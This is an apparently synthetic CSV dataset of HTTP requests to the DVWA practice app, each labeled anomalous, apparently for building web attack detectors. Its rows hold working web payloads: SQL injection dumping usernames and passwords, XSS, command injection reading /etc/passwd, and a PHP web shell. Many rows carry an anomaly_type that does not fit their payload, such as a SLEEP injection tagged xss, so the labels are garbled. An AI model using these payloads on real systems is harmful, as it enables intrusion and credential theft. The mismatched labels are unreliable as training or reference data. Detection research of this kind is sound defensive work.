request_id,timestamp,method,url,headers,body,app_target,anomaly_type,label
159,2025-12-02 2:20:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c1b42eb5aa632d34fbbdfcc3232b4df1"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,xss,anomalous
160,2025-12-02 2:30:00,GET,http://dvwa.local/vulnerabilities/xss_r/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2561f2cabb55fb6aecd25fba1ba1acf1"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
161,2025-12-02 2:40:00,POST,http://dvwa.local/vulnerabilities/xss_d/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=cbccec5a2afc2cefcedea1dbff4cdb46"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,xss,anomalous
162,2025-12-02 2:50:00,GET,http://dvwa.local/vulnerabilities/upload/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b5f625d33cd152b1a6af4a1f44fc1a36"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
163,2025-12-02 3:00:00,GET,http://dvwa.local/vulnerabilities/csrf/?name=%3Cimg+src=x+onerror=alert(1)%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2bfd353af45e4ef25a5dafd6144a53a6"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
164,2025-12-02 3:10:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e2ec1a3c6cbf616c3ced3daef1b331d2"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,sqli,anomalous
165,2025-12-02 3:20:00,GET,http://dvwa.local/vulnerabilities/xss_d/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=a5d6bd3f512d61bef2da5c62ee2d235f"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
166,2025-12-02 3:30:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=cdf64aefb63d6532bcadbdc1adee1bd6"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,file_upload,anomalous
167,2025-12-02 3:40:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6b6112d56463436ebfa3ba2ced2c144c"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,sqli,anomalous
168,2025-12-02 3:50:00,GET,http://dvwa.local/vulnerabilities/sql_i/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6ef21a3e3feaedf1c53efb353e52bd61"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
169,2025-12-02 4:00:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=be5e134bce1a45d1faad65f25ff3cbd6"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",<?php system($_GET['cmd']); ?>,DVWA,sqli,anomalous
170,2025-12-02 4:10:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=152f3b115bad5bbdf5ed1614cb41543d"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;cat /etc/passwd,DVWA,command_injection,anomalous
171,2025-12-02 4:20:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4a1efe5bbcc5241114bfa46fde4524e3"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",filename=shell.php,DVWA,sqli,anomalous
172,2025-12-02 4:30:00,GET,http://dvwa.local/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=5bcbba34a44ab41abda3446c5ceb566e"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
173,2025-12-02 4:40:00,GET,http://dvwa.local/vulnerabilities/sql_i/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1a44136c4a3665f3c3b56f1e4df1fed3"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
174,2025-12-02 4:50:00,GET,http://dvwa.local/vulnerabilities/csrf/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ef335ce6f5546ea33e13be3635cecc5e"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
175,2025-12-02 5:00:00,POST,http://dvwa.local/vulnerabilities/sqli_blind/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=442446e3661bfbfc6a34fac2dd2421ff"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;id,DVWA,command_injection,anomalous
176,2025-12-02 5:10:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=141a465bf5fac245bfde41f11f1bad2e"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;id,DVWA,command_injection,anomalous
177,2025-12-02 5:20:00,GET,http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=aa5e3a5ebeee2c225adeadf515d326ee"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
178,2025-12-02 5:30:00,GET,http://dvwa.local/vulnerabilities/xss_r/?ip=127.0.0.1;id,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3cf43bd6c26a5cdd1426312d11fea41d"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
179,2025-12-02 5:40:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=e2f4ca351c63f6124f121ebb3dfd4ace"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,command_injection,anomalous
180,2025-12-02 5:50:00,GET,http://dvwa.local/vulnerabilities/xss_s/?name=%3Cimg+src=x+onerror=alert(1)%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ebcc4f1f2abbd42c56fa5b255ee2b63b"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
181,2025-12-02 6:00:00,GET,http://dvwa.local/vulnerabilities/upload/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1466d5cb4d2e3cfbc6fd2fe6df3656e3"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
182,2025-12-02 6:10:00,GET,http://dvwa.local/vulnerabilities/sqli/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=52634c1d6e4b55e5e6db4cc55254ea54"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
183,2025-12-02 6:20:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=354431e243faa224be2dab1644534df3"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,command_injection,anomalous
184,2025-12-02 6:30:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4cec565c662256c3cefdbe6b3f6f3b3c"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,command_injection,anomalous
185,2025-12-02 6:40:00,POST,http://dvwa.local/vulnerabilities/exec/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b526d3febdd25e3fabd33333dbadc566"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;id,DVWA,csrf,anomalous
186,2025-12-02 6:50:00,POST,http://dvwa.local/vulnerabilities/sqli/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1e63b5accfefb3fdd6f6def5d461fb3f"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,xss,anomalous
187,2025-12-02 7:00:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=abcad3f66ae3ff55bb5cc1d522611ea4"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",passwordNew=admin&passwordConf=admin&Change=Change,DVWA,sqli,anomalous
188,2025-12-02 7:10:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=33e265ba42f62a626d3361ca2daa6eec"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,file_upload,anomalous
189,2025-12-02 7:20:00,GET,http://dvwa.local/vulnerabilities/xss_r/?id=1' OR '1'='1--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b4d42bff4d3b241f5f1f442ffaefc3bf"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
190,2025-12-02 7:30:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=f5fbb551daaabfb21dda1b2ccea5d2f3"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,csrf,anomalous
191,2025-12-02 7:40:00,GET,http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ca6d3faea2fe233d423634bbc43cafbc"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
192,2025-12-02 7:50:00,POST,http://dvwa.local/vulnerabilities/xss_d/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4bfb53ffafcd4eeb5fef136ae13655ca"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,sqli,anomalous
193,2025-12-02 8:00:00,POST,http://dvwa.local/vulnerabilities/sqli_blind/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=1d25b22ffb3ff123653f53ef62ef6bc3"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",<?php system($_GET['cmd']); ?>,DVWA,sqli,anomalous
194,2025-12-02 8:10:00,GET,http://dvwa.local/vulnerabilities/fi/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=c2be6dcaa5eb45aaf2bcdeea5db31336"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
195,2025-12-02 8:20:00,GET,"http://dvwa.local/vulnerabilities/fi/?id=1'+UNION+SELECT+1,username,password+FROM+users--","{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=425b11cbce334f5be4bc64a5fdcd3e2c"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
196,2025-12-02 8:30:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=4eef54eaba46bd6ba4225a2321de31d3"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
197,2025-12-02 8:40:00,GET,http://dvwa.local/vulnerabilities/sqli/?name=%3Cimg+src=x+onerror=alert(1)%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3fc142354ecdae33b6db114ba42c436b"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
198,2025-12-02 8:50:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=b46f1aec313625cd341be3b1c4fbfebf"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,xss,anomalous
199,2025-12-02 9:00:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=a3e145226363fb1ff6113fab16b5bed1"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,sqli,anomalous
200,2025-12-02 9:10:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=df4b2a55c4fbe5f1154f3241fff5d42e"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,xss,anomalous
201,2025-12-02 9:20:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=6532531431b1c21a1cf5b6ca4c35f42e"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
202,2025-12-02 9:30:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=fe5ddbbcbdbdec2daaedede4bc42f4eb"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1' OR '1'='1--,DVWA,sqli,anomalous
203,2025-12-02 9:40:00,POST,http://dvwa.local/vulnerabilities/csrf/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=aa25a12b42b1f514b1cc661a4622ca6d"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;id,DVWA,command_injection,anomalous
204,2025-12-02 9:50:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=21a31debb1df26d3ed4fc6ef2a32af53"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
205,2025-12-02 10:00:00,POST,http://dvwa.local/vulnerabilities/sql_i/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=142aa433e44ec43af6fcad6eb2d3cfed"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;id,DVWA,csrf,anomalous
206,2025-12-02 10:10:00,GET,http://dvwa.local/vulnerabilities/xss_d/?id=1' OR '1'='1--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=62bd1cc332c23b6553d5a63235af325d"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
207,2025-12-02 10:20:00,POST,http://dvwa.local/vulnerabilities/exec/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=f1a3a61dee546c366cda2afa465cf644"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,csrf,anomalous
208,2025-12-02 10:30:00,POST,http://dvwa.local/vulnerabilities/xss_d/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=421baad5ab6fd2a31deb4c22ae452e64"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}","id=1'+UNION+SELECT+1,username,password+FROM+users--",DVWA,file_upload,anomalous
209,2025-12-02 10:40:00,GET,http://dvwa.local/vulnerabilities/sql_i/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ba3255b1ef2cbab212e21bf2d612bc41"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
210,2025-12-02 10:50:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?ip=127.0.0.1;cat /etc/passwd,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=62cacf3f351eddb55f623fcf444ee4aa"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
211,2025-12-02 11:00:00,GET,http://dvwa.local/vulnerabilities/sqli/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=bf25e6cdcdc5cccdb4b25ecfeec142f3"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,sqli,anomalous
212,2025-12-02 11:10:00,GET,http://dvwa.local/vulnerabilities/xss_s/?id=1'+AND+SLEEP(5)--,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=cee26ca2c14da45565caf2a1421ffde3"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,file_upload,anomalous
213,2025-12-02 11:20:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=242c5fccfeb5db4d1ca1effefdafda5d"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cimg+src=x+onerror=alert(1)%3E,DVWA,csrf,anomalous
214,2025-12-02 11:30:00,GET,http://dvwa.local/vulnerabilities/sql_i/?filename=shell.php,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=46baaccdd43d366435ad44ee12f14bec"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
215,2025-12-02 11:40:00,POST,http://dvwa.local/vulnerabilities/fi/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3f4dc43cf1e1b6a45ef3e41da46b6d22"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,csrf,anomalous
216,2025-12-02 11:50:00,POST,http://dvwa.local/vulnerabilities/upload/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=ce1cb1f5bb1a3fca6dc2aa1c5ebb1fa6"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",ip=127.0.0.1;whoami,DVWA,xss,anomalous
217,2025-12-02 12:00:00,POST,http://dvwa.local/vulnerabilities/xss_s/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=f3f26213dabae4155f13d5f33d24cc53"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",name=%3Cscript%3Ealert(1)%3C/script%3E,DVWA,file_upload,anomalous
218,2025-12-02 12:10:00,GET,http://dvwa.local/vulnerabilities/sqli_blind/?passwordNew=admin&passwordConf=admin&Change=Change,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3b3a5b512a355e4be414ebcaa23feeca"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,command_injection,anomalous
219,2025-12-02 12:20:00,POST,http://dvwa.local/vulnerabilities/xss_r/,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=3ffa23ffdb52cb3c3adfc351fa2122b3"", ""Content-Type"": ""application/x-www-form-urlencoded"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",id=1'+AND+SLEEP(5)--,DVWA,file_upload,anomalous
220,2025-12-02 12:30:00,GET,http://dvwa.local/vulnerabilities/sqli/?<?php system($_GET['cmd']); ?>,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=aecc5caaa43a6b523a14d226efcbda2a"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,xss,anomalous
221,2025-12-02 12:40:00,GET,http://dvwa.local/vulnerabilities/fi/?name=%3Cscript%3Ealert(1)%3C/script%3E,"{""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"", ""Cookie"": ""security=low; PHPSESSID=2d2a5e4f63461dbd2e64bc4362aa5f13"", ""Content-Type"": ""text/html"", ""Referer"": ""http://dvwa.local/vulnerabilities/""}",,DVWA,csrf,anomalous
